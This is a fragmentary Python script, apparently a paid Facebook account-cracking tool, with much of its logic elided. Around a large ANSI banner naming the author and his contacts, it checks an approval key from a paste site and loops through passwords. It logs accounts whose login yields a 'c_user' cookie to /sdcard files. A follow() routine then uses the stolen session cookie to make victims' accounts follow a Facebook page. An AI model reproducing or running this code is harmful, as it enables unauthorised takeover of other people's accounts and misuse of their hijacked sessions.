...
def main_apv():
    ...
    r1=requests.get("https://justpaste.it/edit/50464224/3n8mvqjat44baaf8").text
    ...
    if key1 in r1:
        ...
        print(logo)
        print ("         ༄RIYAD•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
        print ("             \033[1;94mGIVE ME 120tk FOR APROVAL Rk-Black")            
...
logo="""
 ...
 \033[1;31m██   ██  \033[1;36m██     \033[1;34m██     \033[1;35m██   ██ \033[1;31m██   ██ 
 \033[1;31m██   ██  \033[1;36m██     \033[1;34m██     \033[1;35m██   ██ \033[1;31m██████      
        \033[1;92m༄RIYAD•───────────────────────────────────────•༄KHAN
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : RK RIYAD KHAN           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : Rk-Black           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : ARIYAN KHAN       \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +17867244875       \033[1;93m▇▇
             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGIVE ME 120tk FOR APRVAL      \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄RIYAD•───────────────────────────────────────•༄RIYAD
""" 
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/RIYAD-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/RIYAD-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : RIYAD KHAN")
			print ('\033[1;92m༄RIYAD•───────────────────────────────────────•༄KHAN')
			key = input(" [*] Choose : ")
			print ('༄RIYAD•───────────────────────────────────────•༄KHAN')
...
class __xxx__:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        open('/sdcard/RIYAD_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://www.facebook.com/Itz.magibazRiad.khulekheledibo', cookies={'cookie': coki}).text, 'html.parser')
